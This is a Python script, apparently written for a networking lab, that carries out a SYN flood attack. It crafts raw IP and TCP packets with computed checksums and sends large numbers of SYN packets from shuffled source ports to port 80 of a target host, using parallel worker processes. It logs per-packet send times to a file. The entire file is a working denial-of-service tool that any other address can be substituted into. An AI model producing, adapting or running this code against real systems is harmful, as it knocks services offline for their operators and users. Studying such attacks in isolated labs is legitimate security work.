import socket
import time
import argparse
import struct
import random
import numpy as np
from multiprocessing import Pool

# Argument parser setup
parser = argparse.ArgumentParser(description="SYN Flood Attack Script using Raw Sockets")
parser.add_argument("--inner", type=int, default=10000, help="Number of inner loops")
parser.add_argument("--outer", type=int, default=100, help="Number of outer loops")
parser.add_argument("--workers", type=int, default=1, help="Number of parallel processes")

args = parser.parse_args()

# Constants
INNER_LOOPS = args.inner  # Number of packets sent per outer loop iteration
OUTER_LOOPS = args.outer  # Number of times the inner loop runs
NUM_WORKERS = args.workers  # Number of parallel processes
TARGET_IP = "10.9.0.4"  # Target IP
TARGET_PORT = 80  # Target port, flooding the HTTP port, of the apache2 server running on the target
ATTACKER_IP = "10.9.0.2"  # Attacker IP

# Function to calculate the checksum for the TCP/IP headers
def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1])
        s = s + w
    
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

# Function to construct and send SYN packets using raw sockets
# Returns a numpy array containing the index and time taken for each packet
def attack(worker_id):
    # Initialize a numpy array to store index and time taken for each packet
    index_time = np.zeros((INNER_LOOPS*OUTER_LOOPS//NUM_WORKERS, 2))

    # Create a raw socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

    # Enable IP_HDRINCL to tell the kernel that headers are included in the packet
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    ports = [i for i in range(1024, 65535)]
    random.shuffle(ports)

    index = 0
    for i in range(OUTER_LOOPS//NUM_WORKERS):  # Outer loop
        for j in range(INNER_LOOPS):  # Inner loop
            # IP Header
            ip_header = struct.pack(
                '!BBHHHBBH4s4s',  # Format string for the struct
                69,  # Version (4) and IHL (5)
                0,  # Type of Service
                40,  # Total Length (IP header + TCP header)
                random.randint(0, 65535),  # Identification
                0,  # Fragment Offset
                255,  # TTL
                socket.IPPROTO_TCP,  # Protocol
                0,  # Header Checksum (initially 0)
                socket.inet_aton(ATTACKER_IP),  # Source IP (Attacker's IP)
                socket.inet_aton(TARGET_IP)  # Destination IP (Target's IP)
            )
            rand_seq = random.randint(0, 4294967295) # Random sequence number
            rand_ack = random.randint(0, 4294967295) # Random acknowledgment number

            # TCP Header
            tcp_header = struct.pack(
                '!HHLLBBHHH',  # Format string for the struct
                ports[index % len(ports)],  # Source Port (random)
                TARGET_PORT,  # Destination Port
                rand_seq,  # Sequence Number
                rand_ack,  # Acknowledgment Number
                80,  # Data Offset (5)
                2,  # Flags (SYN)
                5840,  # Window Size
                0,  # Checksum (initially 0)
                0   # Urgent Pointer
            )

            # Construct the pseudo header for checksum calculation
            pseudo_header = struct.pack(
                '!4s4sBBH',
                socket.inet_aton(ATTACKER_IP),  # Source IP
                socket.inet_aton(TARGET_IP),  # Destination IP
                0,  # Reserved
                socket.IPPROTO_TCP,  # Protocol
                len(tcp_header)  # TCP Length
            )

            # Calculate the TCP checksum
            tcp_checksum = checksum(pseudo_header + tcp_header)

            # Rebuild the TCP header with the correct checksum
            tcp_header = struct.pack(
                '!HHLLBBH',  # Format string for the struct
                ports[index % len(ports)],  # Source Port (random)
                TARGET_PORT,  # Destination Port
                rand_seq,  # Sequence Number
                rand_ack,  # Acknowledgment Number
                80,  # Data Offset (5) and Flags (SYN flag set)
                2,  # Flags (SYN)
                5840  # Window Size
            ) + struct.pack('H', tcp_checksum) + struct.pack('!H', 0)

            # Packet is IP Header + TCP Header
            packet = ip_header + tcp_header

            before = time.time()  # Record time before sending the packet

            # Send the packet
            sock.sendto(packet, (TARGET_IP, 0))

            after = time.time()  # Record time after sending the packet

            # Store index and time taken to send the packet
            index_time[index] = [index, (after - before) * 1000]
            index += 1

            # Print status every 1000 packets
            if (j + 1) % 1000 == 0:
                print(f"Worker {worker_id}: Sent {j + 1} packets")

    return index_time

if __name__ == '__main__':
    start = time.time()  # Record start time of the attack

    # Use multiprocessing to run attack in parallel
    with Pool(args.workers) as pool:
        results = pool.map(attack, range(NUM_WORKERS))

    # Concatenate all results from workers
    index_time = np.concatenate(results)
    index_time[:,0] = np.arange(len(index_time))
    

    end = time.time()  # Record end time of the attack

    total_time = sum(index_time[:, 1])  # Calculate total time taken for all packets
    
    

    with open('./syns_result_p.txt', 'w') as file:  # Write results to a file
        for i in range(len(index_time)):
            file.write(f"{int(index_time[i, 0])} {index_time[i, 1]}\n")

    print(f"Attack took {(end - start) * 1000} ms")  # Print total attack duration
    print(f"Total packet send time {total_time} ms")  # Print sum of all packet send times
